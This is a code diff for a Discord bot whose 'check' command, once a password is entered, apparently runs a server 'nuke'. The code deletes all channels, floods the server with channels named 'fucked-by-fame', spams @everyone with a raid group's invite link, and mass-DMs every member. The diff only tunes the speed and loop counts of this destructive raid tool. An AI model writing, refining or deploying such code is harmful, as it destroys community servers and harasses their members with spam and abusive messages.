@@ -40,7 +40,7 @@ client.once('ready', () => {
   console.log(`${client.user.tag} is online`);
 });
 
-// ====================== MESSAGE COMMANDS ======================
+// ====================== COMMANDS ======================
 client.on('messageCreate', async message => {
   if (message.author.bot || !message.guild) return;
   const content = message.content.trim().toLowerCase();
@@ -78,7 +78,7 @@ client.on('interactionCreate', async interaction => {
 
     if (action !== 'check') return;
 
-    // Password & Selection
+    // Password
     if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
       const modal = new ModalBuilder()
         .setCustomId(`check_modal_${interaction.user.id}`)
@@ -146,7 +146,7 @@ client.on('interactionCreate', async interaction => {
       }
     }
 
-    // ==================== FAST + AGGRESSIVE NUKE ====================
+    // ==================== FINAL FIXED NUKE ====================
     if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
       const password = interaction.fields.getTextInputValue('password');
       if (password !== NUKE_PASSWORD) {
@@ -159,42 +159,42 @@ client.on('interactionCreate', async interaction => {
       const guild = client.guilds.cache.get(session?.guildId);
       if (!guild) return interaction.editReply({ content: '❌ Server not found.' });
 
+      await interaction.editReply({ content: `☢️ **FAME TAKEOVER** started on **${guild.name}**...` });
+
       const delay = ms => new Promise(r => setTimeout(r, ms));
       const invite = 'https://discord.gg/NANQMy3WnD';
       const spamText = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;
 
       try {
-        await interaction.editReply({ content: `☢️ **FAME TAKEOVER** started on **${guild.name}**...` });
-
-        // 1. Delete everything
+        // Delete all channels
         for (const ch of guild.channels.cache.values()) {
           await ch.delete().catch(() => {});
-          await delay(400);
+          await delay(450);
         }
 
-        // 2. Fast Channel Creation + Spam
-        await interaction.followUp({ content: '🔨 Creating fucked-by-fame channels + fast spam...', flags: MessageFlags.Ephemeral });
+        await interaction.editReply({ content: '🔨 Creating fucked-by-fame channels + fast spam...' });
 
-        for (let round = 0; round < 5; round++) {
-          // Create channels fast
-          for (let i = 0; i < 12; i++) {
+        // Fast aggressive loop
+        for (let round = 0; round < 6; round++) {
+          // Create channels
+          for (let i = 0; i < 10; i++) {
             try {
-              await guild.channels.create({ name: 'fucked-by-fame', type: 0, reason: 'Fame Takeover' });
-            } catch {}
+              await guild.channels.create({ name: 'fucked-by-fame', type: 0 });
+            } catch (e) {}
           }
 
-          // Fast spam in current channels
-          const channels = guild.channels.cache.filter(c => c.name === 'fucked-by-fame');
-          for (const ch of channels.values()) {
-            for (let s = 0; s < 6; s++) {
+          // Fast spam
+          const currentChannels = guild.channels.cache.filter(c => c.name === 'fucked-by-fame');
+          for (const ch of currentChannels.values()) {
+            for (let s = 0; s < 8; s++) {   // Fast @everyone spam
               ch.send(spamText).catch(() => {});
             }
           }
-          await delay(600);
+          await delay(700);
         }
 
-        // 3. Mass DM
-        await interaction.followUp({ content: '📨 Sending **FAME TAKEN OVER** DMs...', flags: MessageFlags.Ephemeral });
+        // DM Members
+        await interaction.editReply({ content: '📨 Sending DMs...' });
         let dmSent = 0;
         const members = await guild.members.fetch();
 
@@ -203,18 +203,17 @@ client.on('interactionCreate', async interaction => {
           try {
             await member.send(`**FAME TAKEN OVER**\n${invite}\n**fucked by veynetta**`).catch(() => {});
             dmSent++;
-            await delay(900);
+            await delay(800);
           } catch {}
         }
 
-        await interaction.followUp({ 
-          content: `✅ **FAME TAKEOVER COMPLETE**\n• Channels created & spammed fast\n• @everyone tagged in every channel\n• DM sent to **${dmSent}** members`,
-          flags: MessageFlags.Ephemeral 
+        await interaction.editReply({ 
+          content: `✅ **FAME TAKEOVER COMPLETE**\n• Created & spammed \`fucked-by-fame\` channels\n• Fast @everyone spam\n• DM sent to **${dmSent}** members` 
         });
 
       } catch (err) {
         console.error(err);
-        await interaction.followUp({ content: '⚠️ Nuke partially completed.', flags: MessageFlags.Ephemeral }).catch(() => {});
+        await interaction.editReply({ content: '⚠️ Nuke finished (some limits hit).' }).catch(() => {});
       }
 
       userSessions.delete(interaction.user.id);
